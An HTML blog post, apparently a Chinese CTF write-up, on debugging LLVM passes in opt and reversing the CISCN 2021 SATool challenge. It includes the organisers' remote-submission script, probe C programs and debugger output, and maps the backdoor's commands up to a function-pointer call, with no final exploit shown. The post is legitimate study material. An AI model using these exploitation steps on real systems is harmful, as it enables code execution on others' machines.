@@ -1,0 +1,459 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="这是LLVM PASS PWN的第二篇，这一篇主要记录学习一下LLVM PASS PWN如何调试，并拿CISCN 2021 SATool来做第一道LLVM PASS PWN解，笔者的做题环境都是ubuntu20.04  之前的文章链接：  LLVM PASS PWN (一)  LLVM PASS PWN (二)调试 LLVM PASS在正式做LLVM PASS PWN的时候首先学习一下如何调">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LLVM PASS PWN (二)">
+<meta property="og:url" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/index.html">
+<meta property="og:site_name" content="z1r0's blog">
+<meta property="og:description" content="这是LLVM PASS PWN的第二篇，这一篇主要记录学习一下LLVM PASS PWN如何调试，并拿CISCN 2021 SATool来做第一道LLVM PASS PWN解，笔者的做题环境都是ubuntu20.04  之前的文章链接：  LLVM PASS PWN (一)  LLVM PASS PWN (二)调试 LLVM PASS在正式做LLVM PASS PWN的时候首先学习一下如何调">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/1.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/2.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/3.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/4.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/5.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/6.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/7.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/8.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/10.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/12.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/13.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/14.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/11.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/15.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/16.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/17.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/18.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/19.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/20.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/21.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/22.png">
+<meta property="og:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/23.png">
+<meta property="article:published_time" content="2022-10-28T12:09:41.000Z">
+<meta property="article:modified_time" content="2022-10-28T04:45:26.254Z">
+<meta property="article:author" content="z1r0">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>LLVM PASS PWN (二)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/10/28/LLVM-PASS-PWN-%E4%B8%89/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/10/28/LLVM-PASS-PWN/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/&amp;text=LLVM PASS PWN (二)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/&amp;title=LLVM PASS PWN (二)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/&amp;is_video=false&amp;description=LLVM PASS PWN (二)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=LLVM PASS PWN (二)&amp;body=Check out this article: http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/&amp;title=LLVM PASS PWN (二)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/&amp;title=LLVM PASS PWN (二)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/&amp;title=LLVM PASS PWN (二)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/&amp;title=LLVM PASS PWN (二)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/&amp;name=LLVM PASS PWN (二)&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/&amp;t=LLVM PASS PWN (二)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#LLVM-PASS-PWN-%E4%BA%8C"><span class="toc-number">1.</span> <span class="toc-text">LLVM PASS PWN (二)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95-LLVM-PASS"><span class="toc-number">1.1.</span> <span class="toc-text">调试 LLVM PASS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2021-SATool"><span class="toc-number">1.2.</span> <span class="toc-text">CISCN 2021 SATool</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">逆向分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        LLVM PASS PWN (二)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">z1r0</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-10-28T12:09:41.000Z" itemprop="datePublished">2022-10-28</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/study/">study</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <font size="3">
+
+<blockquote>
+<p>这是LLVM PASS PWN的第二篇，这一篇主要记录学习一下LLVM PASS PWN如何调试，并拿CISCN 2021 SATool来做第一道LLVM PASS PWN解，笔者的做题环境都是ubuntu20.04</p>
+</blockquote>
+<p>之前的文章链接：</p>
+<ul>
+<li><a href="">LLVM PASS PWN (一)</a></li>
+</ul>
+<h1 id="LLVM-PASS-PWN-二"><a href="#LLVM-PASS-PWN-二" class="headerlink" title="LLVM PASS PWN (二)"></a>LLVM PASS PWN (二)</h1><h2 id="调试-LLVM-PASS"><a href="#调试-LLVM-PASS" class="headerlink" title="调试 LLVM PASS"></a>调试 LLVM PASS</h2><p>在正式做LLVM PASS PWN的时候首先学习一下如何调试LLVM PASS，还是用上一篇文章的LLVM PASS</p>
+<p>其实真正攻击的目标是opt，上一章使用的opt-12，所以这里使用<code>gdb /bin/opt-12</code>，用<code>set args</code>设置参数传入即可</p>
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/1.png" alt="1" style="zoom:50%;">
+
+<p>开始的时候vmmap可以发现并没有加载LLVMHello.so</p>
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/2.png" alt="1" style="zoom:50%;">
+
+<p>需要将这些call都跑掉之后，就可以看到LLVMHello.so加载成功</p>
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/3.png" alt="1" style="zoom:50%;">
+
+<p>如下加载成功</p>
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/4.png" alt="1" style="zoom:50%;">
+
+<p>如果想要在模块中下断点只需要用so第一个的地址加上偏移即可</p>
+<h2 id="CISCN-2021-SATool"><a href="#CISCN-2021-SATool" class="headerlink" title="CISCN 2021 SATool"></a>CISCN 2021 SATool</h2><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>下载之后可以发现有如下东西</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  附件 ls</span><br><span class="line">libc<span class="number">-2.27</span>.so  libLLVM<span class="number">-8.</span>so<span class="number">.1</span>  libstdc++.so<span class="number">.6</span><span class="number">.0</span><span class="number">.25</span>  opt  quickstart.txt  SAPass.so</span><br></pre></td></tr></tbody></table></figure>
+
+<p>SAPass.so就是自定义的一个Pass，漏洞就发生在这里面，还有一个opt，这个就是我们最后的攻击目标<code>./opt --version</code>即可查看版本</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  附件 ./opt --version</span><br><span class="line"><span class="title function_">LLVM</span> <span class="params">(http:<span class="comment">//llvm.org/):</span></span></span><br><span class="line"><span class="params">  LLVM version <span class="number">8.0</span><span class="number">.1</span></span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">  Optimized build.</span></span><br><span class="line"><span class="params">  Default target: x86_64-pc-linux-gnu</span></span><br><span class="line"><span class="params">  Host CPU: skylake</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>还有一个<code>quickstart.txt</code>，这个是出题人写的说明，看一下</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Jack has developed a malicout analysis tool and leave a backdoor in it.</span><br><span class="line"></span><br><span class="line">Can you hack the tool and get shell?</span><br><span class="line"></span><br><span class="line">You can send the base64 of bitcode to the server, and the server will decode it and run <span class="string">"./opt -load ./SAPass.so -SAPass ./exp.bc“your_bitcode"</span>.</span><br><span class="line"></span><br><span class="line">You can directly use the following script to send base64 code to server:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">con = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">f = open(<span class="string">"./exp.bc"</span>,<span class="string">"rb"</span>)</span><br><span class="line"></span><br><span class="line">payload=f.read()</span><br><span class="line"></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">payload2 = payload.encode(<span class="string">"base64"</span>)</span><br><span class="line">con.sendlineafter(<span class="string">"bitcode: \n"</span>, payload2)</span><br><span class="line"></span><br><span class="line">con.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<p>上面说明了如何操作，并贴出了打远程的脚本，接下来做的就是对SAPass.so进行逆向</p>
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/5.png" alt="5" style="zoom:50%;">
+
+<p>进入ida之后可以发现符号表没了，上一篇文章说过漏洞基本发生在重写<code>runOnFunction</code>的函数，而<code>runOnFunction</code>在vtable最后一个，所以我们现在去寻找一下vtable，跟进sub_1930</p>
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/6.png" alt="5" style="zoom:50%;">
+
+<p>看到对象的创建了，vtable应该就在最下面的<code>off_203d30</code>，直接跟进</p>
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/7.png" alt="5" style="zoom:50%;">
+
+<p>成功发现vtable的位置，上一篇说到最后一个是<code>runOnFunction</code>，因为被重写了所以直接跟进，跟进后发现一共566行的c++的反汇编代码，头大</p>
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/8.png" alt="5" style="zoom:50%;">
+
+<p>从头开始分析，首先是用了getName来获得每个函数的名称，并且名称里面必须有<code>r0oDkc4B</code>，因为是小端序，Name的类型是QWORD存储，所以是<code>B4ckDo0r</code>，但是还会判断v3==8，这里不知道v3是什么，所以我们看一下汇编</p>
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/10.png" alt="5" style="zoom:50%;">
+
+<p>有一个<code>cmp rdx, 8</code>，rdx是上面函数的返回值里的一个，意思就是对象名字的长度是否是8，接着会将<code>B4ckDo0r</code>放入rcx中，会比较rcx和rax地址里的内容，而rax是函数的返回值，所以判断函数名称是否是<code>B4ckDo0r</code>，和上面分析的一样</p>
+<p>接下来的东西很多也很乱，在比赛的时候要做的就是如何能快速筛选出有用的数据，笔者觉得动静分析可以快速的分析这个程序的逻辑，所以我们写一个exp.c再用clang-8编译成exp.ll</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>用上面调试LLVM PASS的方法对这题进行调试，并在<code>SAPass.so的基址 + 0x1A14</code>这里下个断点然后单步执行进行调试，同时在调试的时候结合静态分析，<code>if ( v3 == 8 &amp;&amp; *Name == 'r0oDkc4B' )</code>这个判断已经成功满足，但是最后会跑飞跑到0x2234这里就退出了</p>
+<p>造成这样的原因是<code>B4ckDo0r</code>这个函数已经结束了，没有检测到这个函数里面的东西，那我们给他放入一点东西看一下会不会跑到0x2234这里就退出</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>{</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"hello"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/12.png" alt="5" style="zoom:50%;">
+
+<p>调试之后发现已经跑不到219这里了已经可以继续往下走了，继续调试，当执行到<code>0x1A9E</code>这里时会调用<code>llvm::Value::getName</code></p>
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/13.png" alt="5" style="zoom:50%;">
+
+<p>获取到了printf这个函数，并且长度放入rdx中，继续调试，会执行到<code>if ( !(unsigned int)std::string::compare(&amp;fnc_name, "save") )</code>这条语句，一参是printf函数的名字，二参是save，这个意思就是判断是否在<code>B4ckDo0r</code>中调用了save函数</p>
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/14.png" alt="5" style="zoom:50%;">
+
+<p>既然这样判断了，那肯定还有类似的判断，漏洞及有可能出现在这些函数处理功能内，一个一个看，首先是save函数</p>
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/11.png" alt="5" style="zoom:50%;">
+
+<p><code>Invalid opcode</code>这种东西没什么意义，只要正常写程序都不会触发这些报错，我们再写一个exp.c继续调试</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">()</span>{</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>{</span><br><span class="line">        save();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以进入save函数处理功能，但是到了<code>if ( -1431655765 * (unsigned int)((v15 + 24 * v18 - 24 * (unsigned __int64)NumTotalBundleOperands - v20) &gt;&gt; 3) == 2 )</code>这里之后会直接退出了，会判断是否为2，直接盲猜一下是否是save需要两个参数</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span>{</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>{</span><br><span class="line">        save(<span class="string">"a"</span>, <span class="string">"b"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>成功继续执行了，接着到了核心的地方，v25是一参，v30是二参，会将一参和二参利用memcpy放入一个chunk中</p>
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/15.png" alt="5" style="zoom:50%;">
+
+<p>save功能已经看过，看下面的takeaway，找到了和上面一样的东西，所以我们给takeaway一参</p>
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/16.png" alt="5" style="zoom:50%;">
+
+<p>但是在调试这个处理函数功能中，最后到了<code>heap_ptr = (_QWORD *)heap_ptr[2];</code>然后释放</p>
+<p>继续看stealkey这个功能</p>
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/17.png" alt="5" style="zoom:50%;">
+
+<p>需要注意的下面的<code>byte_204100 = *heap_ptr</code>，这个heap_ptr是我们save的时候所创建的，里面存放的是save的一参和二参，这个<code>byte_204100 = *heap_ptr</code>其实就是把一参给传到204100里了，调试一下看一下是否正确</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx <span class="number">0x7ffff3b72000</span> + <span class="number">0x204100</span></span><br><span class="line"><span class="number">0x7ffff3d76100</span> &lt;byte_204100&gt;:	<span class="number">0x0000000000820061</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>成功执行了，继续看fakekey这个功能</p>
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/18.png" alt="5" style="zoom:50%;">
+
+<p>第482行和上面一样，需要传一个参数，所以我们可以构造如下exp.c</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span>{</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">takeaway</span><span class="params">(<span class="type">char</span> *c)</span>{</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>{</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">char</span> *d)</span>{</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>{</span><br><span class="line">        save(<span class="string">"a"</span>, <span class="string">"b"</span>);</span><br><span class="line">        stealkey();</span><br><span class="line">        fakekey(<span class="string">"c"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/19.png" alt="5" style="zoom:50%;">
+
+<p>调试了之后发现sextvalue是fakekey的一参，但是给了c之后会直接到else这里，所以我们将c改成整数再试试</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span>{</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">takeaway</span><span class="params">(<span class="type">char</span> *c)</span>{</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>{</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">int</span> d)</span>{</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>{</span><br><span class="line">        save(<span class="string">"a"</span>, <span class="string">"b"</span>);</span><br><span class="line">        stealkey();</span><br><span class="line">        fakekey(<span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>再调试一下可以发现byte_204100和*heap_ptr这里的值都加上0x10了</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx <span class="number">0x7ffff3d76100</span></span><br><span class="line"><span class="number">0x7ffff3d76100</span> &lt;byte_204100&gt;:	<span class="number">0x0000000000820071</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>继续下一个功能</p>
+<img src="/2022/10/28/LLVM-PASS-PWN-%E4%BA%8C/20.png" alt="5" style="zoom:50%;">
+
+<p>run这里会直接执行(*heap_ptr)()</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>总结一下上面的操作</p>
+<ul>
+<li>save，会将一参二参放入heap_ptr中</li>
+<li>takeaway，<code>heap_ptr = (_QWORD *)heap_ptr[2];</code></li>
+<li>stealkey，会将save的一参放入<code>byte_204100</code></li>
+<li>fakekey，会将<code>byte_204100</code>和<code>*heap_ptr</code>加上<code>fakekey</code>的一参</li>
+<li>run，会执行<code>*heap_ptr</code></li>
+</ul>
